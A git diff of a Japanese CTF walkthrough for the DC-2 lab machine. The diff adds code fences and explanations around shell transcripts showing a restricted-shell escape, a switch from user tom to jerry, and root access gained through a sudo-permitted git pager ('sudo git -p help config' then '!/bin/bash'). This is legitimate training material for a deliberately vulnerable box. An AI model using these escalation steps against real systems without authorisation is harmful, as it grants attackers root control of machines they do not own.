@@ -335,7 +335,7 @@ Poor old Tom is always running after Jerry.
 Perhaps he should su for all the stress he causes.
 ```
 
-言葉遊びで`su`コマンドを用いることが示唆されていました。
+言葉遊びで`su`コマンドを用いるべきことが示唆されていました。
 `su`を用いることで`tom`から`jerry`へとユーザーを切り替えることが可能ですが、現在の制限された環境下では`su`コマンドを実行することができません。
 
 そこで、実行が許可されている`vi`エディタの機能を用いて、この制限付きシェル（rbash）からの脱出を試みます。
@@ -359,9 +359,17 @@ tom@DC-2:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin:$PATH
 ```
 これにより、べての基本コマンドが解放され、`su`コマンドを用いた`jerry`への切り替えが可能になります。
 
+```bash
 tom@DC-2:~$ su jerry
 Password: 
 
+jerry@DC-2:/home/tom$
+```
+無事、`jerry`ユーザーに切り替えることができました。
+
+`jerry`ユーザーで何ができるのか調べます。
+
+```bash
 jerry@DC-2:/home/tom$ ls -la
 ls: cannot open directory .: Permission denied
 jerry@DC-2:/home/tom$ whoami
@@ -379,6 +387,10 @@ drwxr-xr-x 4 root  root  4096 Mar 21  2019 ..
 -rw-r--r-- 1 jerry jerry 3515 Mar 21  2019 .bashrc
 -rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt
 -rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile
+
+```
+`flag4.txt`を発見できたので中身を覗きました。
+```bash
 jerry@DC-2:~$ cat flag4.txt
 Good to see that you've made it this far - but you're not home yet. 
 
@@ -387,7 +399,11 @@ You still need to get the final flag (the only flag that really counts!!!).
 No hints here - you're on your own now.  :-)
 
 Go on - git outta here!!!!
+```
+未だ最後のフラグファイルが残されていることと、言葉遊びで`git`コマンドの存在が示唆されていました。
 
+`sudo -l`で`git`コマンドが管理者権限で実行できることを確認したのちに、有名な管理者権限のシェルを奪取する手法を試しました。
+```bash
 jerry@DC-2:~$ sudo -l
 Matching Defaults entries for jerry on DC-2:
     env_reset, mail_badpass,
@@ -395,7 +411,10 @@ Matching Defaults entries for jerry on DC-2:
 
 User jerry may run the following commands on DC-2:
     (root) NOPASSWD: /usr/bin/git
+```
 
+ここで、`git`のヘルプページを表示します。これにより管理者権限でコマンドを実行できるので、`!/bin/bash`と入力してルートを奪取します。
+```bash
 jerry@DC-2:~$ sudo git -p help config
 
        Multiple lines can be added to an option by using the --add
@@ -405,6 +424,11 @@ jerry@DC-2:~$ sudo git -p help config
        unset. If you want to handle the lines that do not match the
 !/bin/bash
 root@DC-2:/home/jerry# 
+```
+奪取に成功しました。
+
+権限を確認したのちに、最後のフラグファイルの中身を確認します。
+```bash
 root@DC-2:/home/jerry# whoami
 root
 root@DC-2:/home/jerry# id
@@ -435,3 +459,4 @@ and provided me with feedback - it's all greatly
 appreciated.
 
 If you enjoyed this CTF, send me a tweet via @DCAU7.
+```
